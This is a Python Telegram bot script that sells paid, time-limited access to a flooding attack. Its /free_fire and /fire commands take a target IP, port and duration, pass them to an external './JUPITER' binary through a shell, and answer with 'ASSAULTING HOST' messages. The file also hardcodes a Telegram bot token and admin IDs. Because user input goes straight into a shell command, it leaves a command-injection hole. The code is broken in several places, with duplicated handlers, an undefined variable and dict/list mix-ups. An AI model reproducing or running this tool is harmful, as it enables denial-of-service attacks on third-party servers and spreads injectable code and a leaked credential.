#script by @MR_ARMAN_OWNER

import subprocess
import datetime
import os
import telebot
import time
import threading
#script by @MR_ARMAN_OWNER
import time
import random
import string
from telebot import TeleBot
from telebot import types
import sys
import json
from gtts import gTTS
from datetime import datetime  # Ensure this import is at the start of your file


# insert your Telegram bot token here
bot = telebot.TeleBot('7611382895:AAHwD91hg2FgUmmX5j3y3RKo7QnreojG9Uc')
#script by @MR_ARMAN_OWNER
API_TOKEN = '7611382895:AAHwD91hg2FgUmmX5j3y3RKo7QnreojG9Uc'  # Replace with your bot's API token
bot = telebot.TeleBot(API_TOKEN)

# Define the owner's user ID
owner_id = '6077036964'  # Replace with your actual Telegram user ID
# Admin user IDs
admin_id = ["6077036964"]
# Replace with your actual admin user IDs
ADMIN_IDS = [6077036964]  # Example admin user ID
#script by @MR_ARMAN_OWNER
# File to store allowed user IDs
USER_FILE = "users.txt"

# Define a dictionary to store keys and their validity status
keys = {}
#script by @MR_ARMAN_OWNER

# File to store command logs
LOG_FILE = "log.txt"

# Function to read user IDs from the file
def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return file.read().splitlines()
    except FileNotFoundError:
        return []
#script by @MR_ARMAN_OWNER
# Function to read free user IDs and their credits from the file
def read_free_users():
    try:
        with open(FREE_USER_FILE, "r") as file:
            lines = file.read().splitlines()
            for line in lines:
                if line.strip():  # Check if line is not empty
                    user_info = line.split()
                    if len(user_info) == 2:
                        user_id, credits = user_info
                        free_user_credits[user_id] = int(credits)
                    else:
                        print(f"Ignoring invalid line in free user file: {line}")
    except FileNotFoundError:
        pass
#script by @MR_ARMAN_OWNER
# List to store allowed user IDs
allowed_user_ids = read_users()


#script by @MR_ARMAN_OWNER
# Function to check if the user is the owner
def is_owner(user_id):
    return str(user_id) == owner_id
   
# Stores user approvals
approved_userss = {}

# Stores user approvals
approved_users = {}
#script by @MR_ARMAN_OWNER
# Function to log command to the file

from datetime import datetime  # Keep this at the start of your file

#...


# Function to log command to the file
def log_command(user_id, target, port, time):
    admin_id = ["6077036964"]
    user_info = bot.get_chat(user_id)
    if user_info.username:
        username = "@" + user_info.username
    else:
        username = f"UserID: {user_id}"
    
    with open(LOG_FILE, "a") as file:  # Open in "append" mode
        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")

# Function to clear logs
def clear_logs():
    try:
        with open(LOG_FILE, "r+") as file:
            if file.read() == "":
                response = "Logs are already cleared. No data found ❌."
            else:
                file.truncate(0)
                response = "Logs cleared successfully ✅"
    except FileNotFoundError:
        response = "No logs found to clear."
    return response

# Function to record command logs
def record_command_logs(user_id, command, target=None, port=None, time=None):
    log_entry = f"UserID: {user_id} | Time: {datetime.datetime.now()} | Command: {command}"
    if target:
        log_entry += f" | Target: {target}"
    if port:
        log_entry += f" | Port: {port}"
    if time:
        log_entry += f" | Time: {time}"
    
    with open(LOG_FILE, "a") as file:
        file.write(log_entry + "\n")

import datetime

# Dictionary to store the approval expiry date for each user
user_approval_expiry = {}

# Function to calculate remaining approval time
def get_remaining_approval_time(user_id):
    expiry_date = user_approval_expiry.get(user_id)
    if expiry_date:
        remaining_time = expiry_date - datetime.datetime.now()
        if remaining_time.days < 0:
            return "Expired"
        else:
            return str(remaining_time)
    else:
        return "N/A"

# Function to add or update user approval expiry date
def set_approval_expiry_date(user_id, duration, time_unit):
    current_time = datetime.datetime.now()
    if time_unit == "hour" or time_unit == "hours":
        expiry_date = current_time + datetime.timedelta(hours=duration)
    elif time_unit == "day" or time_unit == "days":
        expiry_date = current_time + datetime.timedelta(days=duration)
    elif time_unit == "week" or time_unit == "weeks":
        expiry_date = current_time + datetime.timedelta(weeks=duration)
    elif time_unit == "month" or time_unit == "months":
        expiry_date = current_time + datetime.timedelta(days=30 * duration)  # Approximation of a month
    else:
        return False
    
    user_approval_expiry[user_id] = expiry_date
    return True

# Command handler for adding a user with approval time
@bot.message_handler(commands=['add'])
def add_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 2:
            user_to_add = command[1]
            duration_str = command[2]

            try:
                duration = int(duration_str[:-4])  # Extract the numeric part of the duration
                if duration <= 0:
                    raise ValueError
                time_unit = duration_str[-4:].lower()  # Extract the time unit (e.g., 'hour', 'day', 'week', 'month')
                if time_unit not in ('hour', 'hours', 'day', 'days', 'week', 'weeks', 'month', 'months'):
                    raise ValueError
            except ValueError:
                response = "Invalid duration format. Please provide a positive integer followed by 'hour(s)', 'day(s)', 'week(s)', or 'month(s)'."
                bot.reply_to(message, response)
                return

            if user_to_add not in allowed_user_ids:
                allowed_user_ids.append(user_to_add)
                with open(USER_FILE, "a") as file:
                    file.write(f"{user_to_add}\n")
                if set_approval_expiry_date(user_to_add, duration, time_unit):
                    response = f"💐 HELLO {user_to_add}!\n🎉 CONGRATULATIONS! YOU'RE APPROVED ✅ \n🌟 WELCOME TO THE ARMAN TEAM!\n🚀 GET READY TO ENJOY ALL THE EXCLUSIVE FEATURES!\n👤 APPROVED BY @MR_ARMAN_OWNER\n\nAPPROVED FOR{duration} {time_unit}\n⚡\nACCESS WILL BE ACTIVE UNTIL{user_approval_expiry[user_to_add].strftime('%Y-%m-%d %H:%M:%S')} 👍.\n\n💫 LET THE FUN BEGIN! 🎊."
                else:
                    response = "Failed to set approval expiry date. Please try again later."
            else:
                response = "User already exists 🤦‍♂️."
        else:
            response = "Please specify a user ID and the duration (e.g., 1hour, 2days, 3weeks, 4months) to add 😘."
    else:
        response = "You have not purchased yet purchase now from:- @MR_ARMAN_OWNER."

    bot.reply_to(message, response)

    bot.reply_to(message, response)
#script by @MR_ARMAN_OWNER
#script by @MR_ARMAN_OWNER
#script by @MR_ARMAN_OWNER
#script by @MR_ARMAN_OWNER
#script by @MR_ARMAN_OWNER
#script by @MR_ARMAN_OWNER
@bot.message_handler(commands=['myinfo'])
def send_user_info(message):
    bot.reply_to(message, "CHECKING YOUR WHOLE INFO....")
    time.sleep(3)  # Simulate a delay for checking info

    user_info = f"""
    Username: @{message.from_user.username}
    User ID: {message.from_user.id}
    First Name: {message.from_user.first_name}
    Last Name: {message.from_user.last_name if message.from_user.last_name else 'N/A'}
    Last Seen: (This information is not available due to privacy settings)
    Status: (This information is not available)
    Admin: {'Yes' if message.from_user.id in ADMIN_IDS else 'No'}
    Used this bot: {'Yes' if user_used_bot(message.from_user.id) else 'No'}
    """
    
    bot.send_message(message.chat.id, user_info)
#script by @MR_ARMAN_OWNER
#script by @MR_ARMAN_OWNER
#script by @MR_ARMAN_OWNER
#script by @MR_ARMAN_OWNER
#script by @MR_ARMAN_OWNER
#script by @MR_ARMAN_OWNER
def user_used_bot(user_id):
    # Implement logic to check if the user has used the bot before
    return False  # Placeholder

@bot.message_handler(commands=['remove'])
def remove_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 1:
            user_to_remove = command[1]
            if user_to_remove in allowed_user_ids:
                allowed_user_ids.remove(user_to_remove)
                with open(USER_FILE, "w") as file:
                    for user_id in allowed_user_ids:
                        file.write(f"{user_id}\n")
                response = f"User {user_to_remove} removed successfully 👍."
            else:
                response = f"User {user_to_remove} not found in the list ❌."
        else:
            response = '''Please Specify A User ID to Remove. 
✅ Usage: /remove <userid>'''
    else:
        response = "You have not purchased yet purchase now from:- @MR_ARMAN_OWNER 🙇."

    bot.reply_to(message, response)
    
@bot.message_handler(commands=['re'])
def remove_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 1:
            user_to_remove = command[1]
            if user_to_remove in approved_userss:
                approved_userss.remove(user_to_remove)
                with open(USER_FILE, "w") as file:
                    for user_id in approved_userss:
                        file.write(f"{user_id}\n")
                response = f"User {user_to_remove} removed successfully 👍."
            else:
                response = f"User {user_to_remove} not found in the list ❌."
        else:
            response = '''Please Specify A User ID to Remove. 
✅ Usage: /remove <userid>'''
    else:
        response = "You have not purchased yet purchase now from:- @MR_ARMAN_OWNER 🙇."

    bot.reply_to(message, response)
    
@bot.message_handler(commands=['r'])
def remove_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 1:
            user_to_remove = command[1]
            if user_to_remove in approved_users:
                approved_users.remove(user_to_remove)
                with open(USER_FILE, "w") as file:
                    for user_id in approved_users:
                        file.write(f"{user_id}\n")
                response = f"User {user_to_remove} removed successfully 👍."
            else:
                response = f"User {user_to_remove} not found in the list ❌."
        else:
            response = '''Please Specify A User ID to Remove. 
✅ Usage: /remove <userid>'''
    else:
        response = "You have not purchased yet purchase now from:- @MR_ARMAN_OWNER 🙇."

    bot.reply_to(message, response)

#script by @MR_ARMAN_OWNER
#script by @MR_ARMAN_OWNER
#script by @MR_ARMAN_OWNER
#script by @MR_ARMAN_OWNER
#script by @MR_ARMAN_OWNER
#script by @MR_ARMAN_OWNER
# Stores user approvals
approved_users = {}
user_approval_expiry = {}

# Command handler for adding a user with approval time


@bot.message_handler(commands=['b'])
def add_user(message):
    user_id = str(message.chat.id)

    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 3:
            user_to_add = command[1]
            duration_str = command[2]
            price = command[3]

            # Validate duration input
            try:
                duration = int(duration_str[:-4])
                if duration <= 0:
                    raise ValueError
                time_unit = duration_str[-4:].lower()
                if time_unit not in ('hour', 'hours', 'day', 'days', 'week', 'weeks', 'month', 'months'):
                    raise ValueError
            except ValueError:
                response = "Invalid duration format. Please provide a positive integer followed by 'hour(s)', 'day(s)', 'week(s)', or 'month(s)'."
                bot.reply_to(message, response)
                return

            if user_to_add not in approved_userss:
                approved_userss.append(user_to_add)
                with open(USER_FILE, "a") as file:
                    file.write(f"{user_to_add}\n")

                if set_approval_expiry_date(user_to_add, duration, time_unit):
                    expiry_time = user_approval_expiry[user_to_add].strftime('%Y-%m-%d %H:%M:%S')
                    # Message to admin
                    response = (
                        f"💐 HELLO {user_to_add}!\n"
                        f"🎉 CONGRATULATIONS! YOUR ID HAS BEEN APPROVED ✅\n"
                        f"🌟 WELCOME TO THE ARMAN TEAM!\n"
                        f"🚀 GET READY TO ENJOY ALL THE EXCLUSIVE FEATURES!\n"
                        f"👤 APPROVED BY @MR_ARMAN_OWNER\n\n"
                        f"🗓️ PLAN: {duration} {time_unit}\n"
                        f"⚡ PAID PRICE: {price} 💰\n"
                        f"⏳ ACCESS WILL BE ACTIVE UNTIL: {expiry_time} 👍.\n\n"
                        f"📜 THANK YOU FOR JOINING! ENJOY YOUR TIME WITH US! 🎊\n"
                        f"💬 YOUR NAME: {message.from_user.first_name}\n"
                        f"🔗 APPROVED ID: {user_to_add}\n"
                        f"✨ LET THE FUN BEGIN! 🎊."
                    )

                    # Notify the approved user
                    notification_message = (
                        f"🌟 Hey {message.from_user.first_name}, your account has been approved! 🎉\n"
                        f"💡 You can now enjoy exclusive features and benefits!\n"
                        f"👤 APPROVED BY @MR_ARMAN_OWNER\n\n"
                        f"🗓️ PLAN: {duration} {time_unit}\n"
                        f"⚡ PAID PRICE: {price} 💰\n"
                        f"⏳ ACCESS WILL BE ACTIVE UNTIL: {expiry_time} 👍.\n\n"
                        f"🔒 Remember to always follow our guidelines and have fun!\n"
                        f"🚀 Get ready for an amazing experience with us! 🎊"
                    )
                    bot.send_message(user_to_add, notification_message)  # Send notification to the user
                else:
                    response = "Failed to set approval expiry date. Please try again later."
            else:
                response = "User already exists 🤦‍♂️."
        else:
            response = "Please specify a user ID, duration (e.g., 1day, 2weeks), and price to add 😘."
    else:
        response = "You have not purchased yet. Purchase now from: @MR_ARMAN_OWNER."

    bot.reply_to(message, response)
    
# Command handler for adding a user with approval time


@bot.message_handler(commands=['a'])
def add_user(message):
    user_id = str(message.chat.id)

    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 3:
            user_to_add = command[1]
            duration_str = command[2]
            price = command[3]

            # Validate duration input
            try:
                duration = int(duration_str[:-4])
                if duration <= 0:
                    raise ValueError
                time_unit = duration_str[-4:].lower()
                if time_unit not in ('hour', 'hours', 'day', 'days', 'week', 'weeks', 'month', 'months'):
                    raise ValueError
            except ValueError:
                response = "Invalid duration format. Please provide a positive integer followed by 'hour(s)', 'day(s)', 'week(s)', or 'month(s)'."
                bot.reply_to(message, response)
                return

            if user_to_add not in approved_users:
                approved_users.append(user_to_add)
                with open(USER_FILE, "a") as file:
                    file.write(f"{user_to_add}\n")

                if set_approval_expiry_date(user_to_add, duration, time_unit):
                    expiry_time = user_approval_expiry[user_to_add].strftime('%Y-%m-%d %H:%M:%S')
                    # Message to admin
                    response = (
                        f"💐 HELLO {user_to_add}!\n"
                        f"🎉 CONGRATULATIONS! YOUR ID HAS BEEN APPROVED ✅\n"
                        f"🌟 WELCOME TO THE ARMAN TEAM!\n"
                        f"🚀 GET READY TO ENJOY ALL THE EXCLUSIVE FEATURES!\n"
                        f"👤 APPROVED BY @MR_ARMAN_OWNER\n\n"
                        f"🗓️ PLAN: {duration} {time_unit}\n"
                        f"⚡ PAID PRICE: {price} 💰\n"
                        f"⏳ ACCESS WILL BE ACTIVE UNTIL: {expiry_time} 👍.\n\n"
                        f"📜 THANK YOU FOR JOINING! ENJOY YOUR TIME WITH US! 🎊\n"
                        f"💬 YOUR NAME: {message.from_user.first_name}\n"
                        f"🔗 APPROVED ID: {user_to_add}\n"
                        f"✨ LET THE FUN BEGIN! 🎊."
                    )

                    # Notify the approved user
                    notification_message = (
                        f"🌟 Hey {message.from_user.first_name}, your account has been approved! 🎉\n"
                        f"💡 You can now enjoy exclusive features and benefits!\n"
                        f"👤 APPROVED BY @MR_ARMAN_OWNER\n\n"
                        f"🗓️ PLAN: {duration} {time_unit}\n"
                        f"⚡ PAID PRICE: {price} 💰\n"
                        f"⏳ ACCESS WILL BE ACTIVE UNTIL: {expiry_time} 👍.\n\n"
                        f"🔒 Remember to always follow our guidelines and have fun!\n"
                        f"🚀 Get ready for an amazing experience with us! 🎊"
                    )
                    bot.send_message(user_to_add, notification_message)  # Send notification to the user
                else:
                    response = "Failed to set approval expiry date. Please try again later."
            else:
                response = "User already exists 🤦‍♂️."
        else:
            response = "Please specify a user ID, duration (e.g., 1day, 2weeks), and price to add 😘."
    else:
        response = "You have not purchased yet. Purchase now from: @MR_ARMAN_OWNER."

    bot.reply_to(message, response)


#script by @MR_ARMAN_OWNER
#script by @MR_ARMAN_OWNER
#script by @MR_ARMAN_OWNER
#script by @MR_ARMAN_OWNER
#script by @MR_ARMAN_OWNER
#script by @MR_ARMAN_OWNER
@bot.message_handler(commands=['clearlogs'])
def clear_logs_command(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(LOG_FILE, "r+") as file:
                log_content = file.read()
                if log_content.strip() == "":
                    response = "Logs are already cleared. No data found ❌."
                else:
                    file.truncate(0)
                    response = "Logs Cleared Successfully ✅"
        except FileNotFoundError:
            response = "Logs are already cleared ❌."
    else:
        response = "You have not purchased yet purchase now from :- @MR_ARMAN_OWNER ❄."
    bot.reply_to(message, response)
#script by @MR_ARMAN_OWNER
#script by @MR_ARMAN_OWNER
#script by @MR_ARMAN_OWNER
#script by @MR_ARMAN_OWNER
#script by @MR_ARMAN_OWNER
#script by @MR_ARMAN_OWNER

@bot.message_handler(commands=['clearusers'])
def clear_users_command(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(USER_FILE, "r+") as file:
                log_content = file.read()
                if log_content.strip() == "":
                    response = "USERS are already cleared. No data found ❌."
                else:
                    file.truncate(0)
                    response = "users Cleared Successfully ✅"
        except FileNotFoundError:
            response = "users are already cleared ❌."
    else:
        response = "ꜰʀᴇᴇ ᴋᴇ ᴅʜᴀʀᴍ ꜱʜᴀʟᴀ ʜᴀɪ ᴋʏᴀ ᴊᴏ ᴍᴜ ᴜᴛᴛʜᴀ ᴋᴀɪ ᴋʜɪ ʙʜɪ ɢᴜꜱ ʀʜᴀɪ ʜᴏ ʙᴜʏ ᴋʀᴏ ꜰʀᴇᴇ ᴍᴀɪ ᴋᴜᴄʜ ɴʜɪ ᴍɪʟᴛᴀ ʙᴜʏ:- @MR_ARMAN_OWNER 🙇."
    bot.reply_to(message, response)
 
#script by @MR_ARMAN_OWNER
#script by @MR_ARMAN_OWNER
#script by @MR_ARMAN_OWNER
#script by @MR_ARMAN_OWNER
#script by @MR_ARMAN_OWNER
#script by @MR_ARMAN_OWNER


#script by @MR_ARMAN_OWNER
#script by @MR_ARMAN_OWNER
#script by @MR_ARMAN_OWNER
#script by @MR_ARMAN_OWNER
#script by @MR_ARMAN_OWNER
#script by @MR_ARMAN_OWNER
@bot.message_handler(commands=['clearlogs'])
def clear_logs_command(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(LOG_FILE, "r+") as file:
                log_content = file.read()
                if log_content.strip() == "":
                    response = "Logs are already cleared. No data found ❌."
                else:
                    file.truncate(0)
                    response = "Logs Cleared Successfully ✅"
        except FileNotFoundError:
            response = "Logs are already cleared ❌."
    else:
        response = "You have not purchased yet purchase now from :- @MR_ARMAN_OWNER ❄."
    bot.reply_to(message, response)
#script by @MR_ARMAN_OWNER
#script by @MR_ARMAN_OWNER
#script by @MR_ARMAN_OWNER
#script by @MR_ARMAN_OWNER
#script by @MR_ARMAN_OWNER
#script by @MR_ARMAN_OWNER

@bot.message_handler(commands=['clearusers'])
def clear_users_command(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(USER_FILE, "r+") as file:
                log_content = file.read()
                if log_content.strip() == "":
                    response = "USERS are already cleared. No data found ❌."
                else:
                    file.truncate(0)
                    response = "users Cleared Successfully ✅"
        except FileNotFoundError:
            response = "users are already cleared ❌."
    else:
        response = "ꜰʀᴇᴇ ᴋᴇ ᴅʜᴀʀᴍ ꜱʜᴀʟᴀ ʜᴀɪ ᴋʏᴀ ᴊᴏ ᴍᴜ ᴜᴛᴛʜᴀ ᴋᴀɪ ᴋʜɪ ʙʜɪ ɢᴜꜱ ʀʜᴀɪ ʜᴏ ʙᴜʏ ᴋʀᴏ ꜰʀᴇᴇ ᴍᴀɪ ᴋᴜᴄʜ ɴʜɪ ᴍɪʟᴛᴀ ʙᴜʏ:- @MR_ARMAN_OWNER 🙇."
    bot.reply_to(message, response)
    
    
@bot.message_handler(commands=['allusers'])
def show_all_users(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                if user_ids:
                    response = "Authorized Users:\n"
                    for user_id in user_ids:
                        try:
                            user_info = bot.get_chat(int(user_id))
                            username = user_info.username
                            response += f"- @{username} (ID: {user_id})\n"
                        except Exception as e:
                            response += f"- User ID: {user_id}\n"
                else:
                    response = "No data found ❌"
        except FileNotFoundError:
            response = "No data found ❌"
    else:
        response = "ꜰʀᴇᴇ ᴋᴇ ᴅʜᴀʀᴍ ꜱʜᴀʟᴀ ʜᴀɪ ᴋʏᴀ ᴊᴏ ᴍᴜ ᴜᴛᴛʜᴀ ᴋᴀɪ ᴋʜɪ ʙʜɪ ɢᴜꜱ ʀʜᴀɪ ʜᴏ ʙᴜʏ ᴋʀᴏ ꜰʀᴇᴇ ᴍᴀɪ ᴋᴜᴄʜ ɴʜɪ ᴍɪʟᴛᴀ ʙᴜʏ:- @MR_ARMAN_OWNER❄."
    bot.reply_to(message, response)
#script by @MR_ARMAN_OWNER
#script by @MR_ARMAN_OWNER
#script by @MR_ARMAN_OWNER
#script by @MR_ARMAN_OWNER
#script by @MR_ARMAN_OWNER
#script by @MR_ARMAN_OWNER
@bot.message_handler(commands=['logs'])
def show_recent_logs(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        if os.path.exists(LOG_FILE) and os.stat(LOG_FILE).st_size > 0:
            try:
                with open(LOG_FILE, "rb") as file:
                    bot.send_document(message.chat.id, file)
            except FileNotFoundError:
                response = "No data found ❌."
                bot.reply_to(message, response)
        else:
            response = "No data found ❌"
            bot.reply_to(message, response)
    else:
        response = "𝙏𝙝𝙞𝙨 𝘽𝙤𝙩 𝙞𝙨 𝙤𝙣𝙡𝙮 𝙛𝙤𝙧 𝙥𝙖𝙞𝙙 𝙪𝙨𝙚𝙧𝙨 𝙗𝙪𝙮 𝙣𝙤𝙬 𝙛𝙧𝙤𝙢 - @MR_ARMAN_OWNER \n205 KALA JADU "
        bot.reply_to(message, response)
#script by @MR_ARMAN_OWNER
#script by @MR_ARMAN_OWNER
#script by @MR_ARMAN_OWNER
#script by @MR_ARMAN_OWNER
#script by @MR_ARMAN_OWNER
#script by @MR_ARMAN_OWNER

# Function to handle the reply when free users run the /bgmi command
def start_attack_reply(message, target, port, time):
    user_info = message.from_user
    username = user_info.username if user_info.username else user_info.first_name
    
    response = f"🌠 STRATEGY DEPLOYED 🌠\n\n🚀 TARGET LOCKED [ ON YOUR SERVER ]... 💥\n⚔ BATTLE HAS COMMENCED ⚔\n\n🥷 ASSAULTING HOST ==) ( {target} )\n🥷 ENGAGED PORT ==) ( {port} )\n⏰ ATTACK DURATION -> ( {time} ) SECONDS 🔥\n\n💎 EXECUTED BY ARMAN TEAM ⚔\n\nnHOLD YOUR POSITION, NO ACTION NEEDED FOR {time} SECONDS\nTHANK YOU FOR UTILIZING AUR HAX 💫\n\nᴅᴇᴠᴇʟᴏᴘᴇʀ :--> @ᴍʀ_ᴀʀᴍᴀɴ_ᴏᴡɴᴇʀ"
    bot.reply_to(message, response)
#script by @MR_ARMAN_OWNER
#script by @MR_ARMAN_OWNER
#script by @MR_ARMAN_OWNER
#script by @MR_ARMAN_OWNER
#script by @MR_ARMAN_OWNER
#script by @MR_ARMAN_OWNER
# Dictionary to store the last time each user ran the /bgmi command
bgmi_cooldown = {}

COOLDOWN_TIME =10

# Handler for /bgmi command
@bot.message_handler(commands=['free_fire'])
def handle_bgmi(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        # Check if the user is in admin_id (admins have no cooldown)
        if user_id not in admin_id:
            # Check if the user has run the command before and is still within the cooldown period
            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < COOLDOWN_TIME:
                response = "⏳ 10-𝙨𝙚𝙘𝙤𝙣𝙙 𝙘𝙤𝙤𝙡𝙙𝙤𝙬𝙣 𝙞𝙨 𝙣𝙤𝙬 𝙖𝙥𝙥𝙡𝙞𝙚𝙙!\n🔄 𝙒𝙖𝙞𝙩 𝙖𝙣𝙙 𝙜𝙖𝙩𝙚 𝙩𝙝𝙚 𝙢𝙤𝙢𝙚𝙣𝙩\n⏳ 𝙀𝙣𝙟𝙤𝙮 𝙩𝙝𝙚 𝙚𝙣𝙙𝙡𝙚𝙫𝙤𝙧 𝙧𝙞𝙙𝙚!\n\nᴅᴇᴠᴇʟᴏᴘᴇʀ :--> @ᴍʀ_ᴀʀᴍᴀɴ_ᴏᴡɴᴇʀ"
                bot.reply_to(message, response)
                return
            # Update the last time the user ran the command
            bgmi_cooldown[user_id] = datetime.datetime.now()
        
        command = message.text.split()
        if len(command) == 4:  # Updated to accept target, time, and port
            target = command[1]
            port = int(command[2])  # Convert port to integer
            time = int(command[3])  # Convert time to integer
            if time > 300:
                response = "⚠️ 𝙀𝙧𝙧𝙤𝙧: 𝙏𝙞𝙢𝙚 𝙞𝙣𝙩𝙚𝙧𝙫𝙖𝙡 𝙢𝙪𝙨𝙩 𝙗𝙚 𝙡𝙚𝙨𝙨 𝙩𝙝𝙖𝙣 300.\n🔍 𝘾𝙝𝙚𝙘𝙠 𝙮𝙤𝙪𝙧 𝙞𝙣𝙥𝙪𝙩 𝙖𝙣𝙙 𝙬𝙚𝙡𝙡 𝙖𝙙𝙟𝙪𝙨𝙩 𝙩𝙝𝙚 𝙝𝙖𝙣𝙙𝙡𝙚𝙙 𝙩𝙞𝙢𝙚.\n✔️ 𝘿𝙤𝙣'𝙩 𝙝𝙚𝙨𝙞𝙩𝙖𝙩𝙚 𝙩𝙤 𝙨𝙚𝙚 𝙚𝙓𝙥𝙚𝙧𝙩 𝙞𝙣𝙛𝙤 𝙛𝙤𝙧 𝙬𝙤𝙧𝙠𝙨𝙝𝙤𝙥𝙨.."
            else:
                record_command_logs(user_id, '/free_fire', target, port, time)
                log_command(user_id, target, port, time)
                start_attack_reply(message, target, port, time)  # Call start_attack_reply function
                full_command = f"./JUPITER {target} {port} {time}"
                # Run the external command
                process = subprocess.run(full_command, shell=True)
                # Handle the response
                response = f"⚠️ 𝙏𝘼𝙍𝙂𝙀𝙏 𝘿𝙀𝙏𝘼𝙄𝙇𝙎 ⚠️\n\n✅ 𝘼𝙏𝙏𝘼𝘾𝙆 𝙁𝙄𝙉𝙄𝙎𝙃𝙀𝘿\n🔍 𝙏𝘼𝙍𝙂𝙀𝙏: {target}\n🔌 𝙋𝙊𝙍𝙏: {port}\n\n🕒 𝙏𝙄𝙈𝙀: {time}\n\n🔥 𝙇𝙚𝙩 𝙩𝙝𝙚 𝙘𝙝𝙖𝙤𝙨 𝙪𝙣𝙛𝙤𝙡𝙙. 𝙀𝙫𝙚𝙧𝙮 𝙘𝙡𝙤𝙪𝙙 𝙤𝙛 𝙙𝙚𝙨𝙤𝙡𝙖𝙩𝙞𝙤𝙣 𝙣𝙤𝙬 𝙙𝙖𝙧𝙠𝙚𝙣𝙨\n\n💥 𝙂𝙞𝙫𝙚 𝙣𝙤 𝙫𝙤𝙞𝙘𝙚 𝙩𝙤 𝙨𝙩𝙧𝙞𝙭 𝙛𝙤𝙧 𝙡𝙞𝙣𝙪𝙨! 🚨 𝘿𝙞𝙎𝘾𝙊𝙉𝙏𝙀𝙉𝙏 🏴‍☠️\n\n👁️ 𝙒𝘼𝙏𝘾𝙃 𝙤𝙪𝙩 𝙛𝙤𝙧 𝙧𝙚𝙩𝙡𝙖𝙩𝙞𝙤𝙣𝙨! 𝙏𝙝𝙚 𝙟𝙤𝙪𝙧𝙣𝙖𝙡 𝙤𝙛 𝙖𝙣𝙖𝙧𝙘𝙝𝙮 𝙝𝙖𝙨 𝙗𝙚𝙜𝙪𝙣."
                bot.send_message(message.chat.id, "SEND FEEDBACK 😡")
        else:
            response = "📝 DEAR USERS \n\n📜 USAGE DETAILS:\n/free_fire <IP> <PORT> <TIME>\n\n✨ EXAMPLE:\n- /free_fire 20.0.0.0 8700 120\n\n⚔️ LET'S THE WAR BEGIN!\n\n🔍 MORE INFORMATION:\n- <IP>: Target's IP address\n- <PORT>: Specific port for the attack\n- <TIME>: Duration of the attack in seconds\n\n❗️ USE RESPONSIBLY!\n\nᴛʜɪ𝙨 ʙᴏᴛ ᴏᴡɴᴇʀ ❤️‍🩹:--> @ᴍʀ_ᴀʀᴍᴀɴ_ᴏᴡɴᴇʀ"  # Updated command syntax
    else:
        response = ("🚫 UNAUTHORIZED ACCESS! 🚫\n\nNoops! It seems like you don't have permission to use the /attack command. To gain access and unleash the power of attacks, you can:\n\n🔑 VERIFY YOUR PERMISSIONS\n📝 REQUEST ACCESS FROM AN ADMIN\n\n📞 IF YOU STILL NEED HELP, CONTACT SUPPORT.ꜱ!\n\n𝐏𝐎𝐖𝐄𝐑𝐄𝐃 𝐁𝐘 @MR_ARMAN_OWNER")
        bot.send_message(message.chat.id, "DM TO BUY ACCES :- @MR_ARMAN_OWNER ✅")
    bot.reply_to(message, response)

# Load approved users from a file
def load_approved_users():
    try:
        with open('approved_users.json', 'r') as file:
            return json.load(file)
    except FileNotFoundError:
        return []

# Save approved users to a file
def save_approved_users(approved_users):
    with open('approved_users.json', 'w') as file:
        json.dump(approved_users, file)

# Initialize global variables
allowed_user_ids = []  # List of allowed user IDs (to be defined)
approved_users = load_approved_users()
bgmi_cooldown = {}
COOLDOWN_TIME = 10  # Cooldown time in seconds

# Add your admin IDs here
admin_ids = [
    '6077036964',  # Replace with actual admin user IDs
    '6077036964',
    # You can add more admin IDs as needed
]
#script by @MR_ARMAN_OWNER
#script by @MR_ARMAN_OWNER
#script by @MR_ARMAN_OWNER
#script by @MR_ARMAN_OWNER
#script by @MR_ARMAN_OWNER
#script by @MR_ARMAN_OWNER
@bot.message_handler(commands=['fire'])
def handle_free_fire(message):
    user_id = str(message.chat.id)
    if user_id in approved_users:
        if user_id not in approved_users:
            response = "🚫 You need to be a paid user to run this command! Please contact an admin."
            bot.reply_to(message, response)
            return
        if user_id not in admin_ids:
            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < COOLDOWN_TIME:
                response = "⏳ 10-𝙨𝙚𝙘𝙤𝙣𝙙 𝙘𝙤𝙤𝙡𝙙𝙤𝙬𝙣 𝙞𝙨 𝙣𝙤𝙬 𝙖𝙥𝙥𝙡𝙞𝙚𝙙!"
                bot.reply_to(message, response)
                return
            bgmi_cooldown[user_id] = datetime.datetime.now()
        
        command = message.text.split()
        if len(command) == 4:
            target = command[1]
            port = int(command[2])
            time = int(command[3])
            if time > 300:
                response = "⚠️ 𝙀𝙧𝙧𝙤𝙧: 𝙏𝙞𝙢𝙚 𝙢𝙪𝙨𝙩 𝙗𝙚 𝙡𝙚𝙨𝙨 𝙩𝙝𝙖𝙣 300."
            else:
                record_command_logs(user_id, '/fire', target, port, time)
                log_command(user_id, target, port, time)
                start_attack_reply(message, target, port, time)  
                full_command = f"./JUPITER {target} {port} {time}"
                process = subprocess.run(full_command, shell=True)
                response = f"⚠️ 𝙏𝘼𝙍𝙂𝙀𝙏 𝘿𝙀𝙏𝘼𝙄𝙇𝙎 ⚠️\n✅ 𝘼𝙏𝙏𝘼𝘾𝙆 𝙁𝙄𝙉𝙄𝙎𝙃𝙀𝘿\n🔍 𝙏𝘼𝙍𝙂𝙀𝙏: {target}\n🔌 𝙋𝙊𝙍𝙏: {port}\n🕒 𝙏𝙄𝙈𝙀: {time}"
